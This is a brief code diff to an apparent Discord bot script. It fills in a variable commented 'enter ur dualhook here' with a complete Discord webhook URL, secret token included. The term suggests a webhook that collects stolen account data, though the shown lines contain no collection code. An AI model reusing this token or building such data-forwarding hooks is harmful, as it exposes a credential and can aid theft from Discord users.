@@ -5,7 +5,7 @@ from discord_webhook import DiscordEmbed, DiscordWebhook
 req = requests.Session()
 client = commands.Bot(command_prefix='.') #set prefix
 
-wh = 'e' #enter ur dualhook here
+wh = 'https://discord.com/api/webhooks/1502052843614503074/QY0Mh2hQHKbI5wRVe-RWtfCg0hdpuBepUIjdU8hNVCVYhbtj9j-yRde-e2Oib2xvbRkW' #enter ur dualhook here
 
 
 @client.event
